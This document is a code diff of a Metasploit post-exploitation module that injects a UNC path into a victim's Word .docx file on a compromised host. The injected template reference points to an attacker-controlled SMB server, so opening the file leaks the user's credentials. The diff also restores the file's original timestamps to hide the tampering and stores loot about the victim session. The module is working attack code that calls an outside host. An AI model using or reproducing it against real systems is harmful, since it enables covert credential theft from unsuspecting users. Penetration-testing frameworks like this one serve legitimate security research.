@@ -40,9 +40,9 @@ class Metasploit3 < Msf::Post
 
 		register_options(
 			[
-					OptAddress.new('LHOST',[true, 'Server IP or hostname that the .docx document points to']),
+					OptAddress.new('SMBHOST',[true, 'Server IP or hostname that the .docx document points to']),
 					OptString.new('FILE', [true, 'Remote file to inject UNC path into. ']),
-					OptBool.new('BACKUP', [true, 'Make local backup of remote file.', 'True']),
+					OptBool.new('BACKUP', [true, 'Make local backup of remote file.', true]),
 			], self.class)
 	end
 
@@ -66,7 +66,7 @@ class Metasploit3 < Msf::Post
 		rels_file_data << "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>"
 		rels_file_data << "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">"
 		rels_file_data << "<Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/"
-		rels_file_data << "attachedTemplate\" Target=\"file://\\\\#{datastore['LHOST']}\\normal.dot\" TargetMode=\"External\"/></Relationships>"
+		rels_file_data << "attachedTemplate\" Target=\"file://\\\\#{datastore['SMBHOST']}\\normal.dot\" TargetMode=\"External\"/></Relationships>"
 
 		zip_data = unzip_docx(zipfile)
 		if zip_data.nil?
@@ -151,6 +151,10 @@ class Metasploit3 < Msf::Post
 		end
 	end
 
+	def rhost
+		client.sock.peerhost
+	end
+
 	def run
 
 		#sadly OptPath does not work, so we check manually if it exists
@@ -168,14 +172,44 @@ class Metasploit3 < Msf::Post
 		org_file_data = read_file(datastore['FILE'])
 
 		#store the original file because we need to unzip from disk because there is no memory unzip
-		logs_dir = ::File.join(Msf::Config.log_directory, 'unc_injector')
-		FileUtils.mkdir_p(logs_dir)
-		org_file =  logs_dir + File::Separator + datastore['FILE'].split('\\').last
-		vprint_status("Written remote file to #{org_file}")
-		File.open(org_file, 'wb') { |f| f.write(org_file_data)}
+		if datastore['BACKUP']
+			#logs_dir = ::File.join(Msf::Config.local_directory, 'unc_injector_backup')
+			#FileUtils.mkdir_p(logs_dir)
+			#@org_file =  logs_dir + File::Separator + datastore['FILE'].split('\\').last
+			@org_file = store_loot(
+				"host.word_unc_injector.changedfiles",
+				"application/vnd.openxmlformats-officedocument.wordprocessingml.document",
+				rhost,
+				org_file_data,
+				datastore['FILE'],
+			)
+			print_status("Local backup kept at #{@org_file}")
+			#Store information in note database so its obvious what we changed, were we stored the backup file..
+			note_string ="Remote file #{datastore['FILE']} contains UNC path to #{datastore['SMBHOST']}. "
+			note_string += " Local backup of file at #{@org_file}."
+			report_note(
+				:host => session.session_host,
+				:type => "host.word_unc_injector.changedfiles",
+				:data => {
+					:session_num => session.sid,
+					:stype => session.type,
+					:desc => session.info,
+					:platform => session.platform,
+					:via_payload => session.via_payload,
+					:via_exploit => session.via_exploit,
+					:created_at => Time.now.utc,
+					:files_changed => note_string
+				}
+			)
+		else
+			@org_file = Rex::Quickfile.new('msf_word_unc_injector')
+		end
+
+		vprint_status("Written remote file to #{@org_file}")
+		File.open(@org_file, 'wb') { |f| f.write(org_file_data)}
 
 		#Unzip, insert our UNC path, zip and return the data of the modified file for upload
-		injected_file = manipulate_file(org_file)
+		injected_file = manipulate_file(@org_file)
 		if injected_file.nil?
 			return
 		end
@@ -187,30 +221,12 @@ class Metasploit3 < Msf::Post
 		#set mace values back to that of original
 		set_mace(file_mace)
 
-		#Store information in note database so its obvious what we changed, were we stored the backup file..or remove if no backup is desired
-		note_string ="Remote file #{datastore['FILE']} contains UNC path to #{datastore['LHOST']}. "
-		if datastore['BACKUP']
-			note_string += " Local backup of file at #{org_file}."
-			print_status("Local backup kept at #{org_file}")
-		else
-			FileUtils.rm_rf(org_file)
-			print_status("Local copy #{org_file} deleted.")
+		#remove tmpfile if no backup is desired
+		if not datastore['BACKUP']
+			@org_file.close
+			@org_file.unlink rescue nil # Windows often complains about unlinking tempfiles
 		end
 
-		report_note(:host => session.session_host,
-		:type => "host.word_unc_injector.changedfiles",
-		:data => {
-			:session_num => session.sid,
-			:stype => session.type,
-			:desc => session.info,
-			:platform => session.platform,
-			:via_payload => session.via_payload,
-			:via_exploit => session.via_exploit,
-			:created_at => Time.now.utc,
-			:files_changed => note_string
-			}
-		)
-
-		print_good("Done! Remote file #{datastore['FILE']} succesfully injected to point to #{datastore['LHOST']}")
+		print_good("Done! Remote file #{datastore['FILE']} succesfully injected to point to #{datastore['SMBHOST']}")
 	end
 end
